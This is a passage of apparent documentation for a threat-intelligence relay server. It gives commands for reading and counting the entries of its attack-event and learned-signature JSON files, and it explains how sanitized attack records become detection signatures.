tail -n 50 relay/ai_training_materials/global_attacks.json

# 2. View attack signatures (patterns extracted)
tail -n 100 relay/ai_training_materials/ai_signatures/learned_signatures.json

# 3. Real-time monitoring - Global Attacks (watch attacks live as they arrive)
tail -f relay/ai_training_materials/global_attacks.json

# 4. Real-time monitoring - Learned Signatures (watch AI learning patterns)
tail -f relay/ai_training_materials/ai_signatures/learned_signatures.json

# 5. Count total attacks received
jq '. | length' relay/ai_training_materials/global_attacks.json

# 6. Count total signatures learned
jq '.signatures | length' relay/ai_training_materials/ai_signatures/learned_signatures.json

# 7. View last 5 attacks (formatted with jq)
jq '.[-5:]' relay/ai_training_materials/global_attacks.json

# 8. View last 10 signatures (formatted)
jq '.signatures[-10:]' relay/ai_training_materials/ai_signatures/learned_signatures.json

# 9. Check relay server logs
docker compose logs relay --tail=50 | grep -i "attack\|signature\|threat"
```

---

## 📊 Understanding Relay Storage Files

### **global_attacks.json** vs **learned_signatures.json**

#### 🗄️ **global_attacks.json** (Attack Database)
**Purpose:** Stores SANITIZED attack events from all connected Windows servers

**Contains:**
- Complete attack records with metadata
- Timestamps (when attack occurred)
- Attack types (SQL Injection, XSS, RCE, etc.)
- Geographic regions (North America, Europe, etc.)
- Sensor IDs (which Windows node detected it)
- Extracted patterns (keywords, encodings)

**Example Entry:**
```json
{
  "attack_type": "SQL Injection",
  "timestamp": "2026-01-12T12:20:00Z",
  "pattern": {
    "keywords": ["union", "select", "from"],
    "encodings": ["url_encoded"]
  },
  "region": "North America",
  "source": "windows-node"
}
```

**Used For:**
- Threat intelligence database
- Attack trend analysis
- Geographic attack mapping
- Customer threat reports
- AI training data

---

#### 🧠 **learned_signatures.json** (Detection Rules)
**Purpose:** Stores AI-LEARNED detection patterns/signatures for identifying future attacks

**Contains:**
- Detection signatures (rules/patterns)
- Pattern metadata (when learned, confidence)
- Attack categories mapped to patterns
- Regex patterns, keywords, encodings
- Signature versioning and updates

**Example Entry:**
```json
{
  "signatures": [
    {
      "signature_id": "sig_001",
      "attack_type": "SQL Injection",
      "pattern_type": "keyword_sequence",
      "pattern": ["union", "select", "*", "from"],
      "confidence": 0.95,
      "learned_at": "2026-01-12T12:00:00Z",
      "occurrences": 127
    }
  ]
}
```

**Used For:**
- Real-time attack detection
- Pattern matching in incoming requests
- Signature-based threat identification
- Distributing detection rules to all Windows nodes
- AI model updates

---

### **Key Differences:**

| Aspect | global_attacks.json | learned_signatures.json |
|--------|-------------------|------------------------|
| **Type** | Event Log/Database | Detection Rules/Patterns |
| **Data** | Attack events | Learned signatures |
| **Purpose** | Historical record | Real-time detection |
| **Updates** | Every attack (real-time) | When AI learns new pattern |
| **Size** | Grows continuously | Grows with new patterns only |
| **Content** | Full attack details | Patterns/rules only |
| **Usage** | Analytics, reporting | Detection, prevention |

---

### **The Flow:**

1. **Attack Detected** → Logged to `global_attacks.json`
2. **AI Analyzes** → Extracts patterns from attack
3. **Pattern Learning** → If new/unique, adds to `learned_signatures.json`
4. **Distribution** → All Windows nodes download new signatures
5. **Detection** → Future attacks matched against signatures

**Think of it like:**
- **global_attacks.json** = Your security camera footage (all events recorded)
- **learned_signatures.json** = Your burglar alarm patterns (rules for detection)


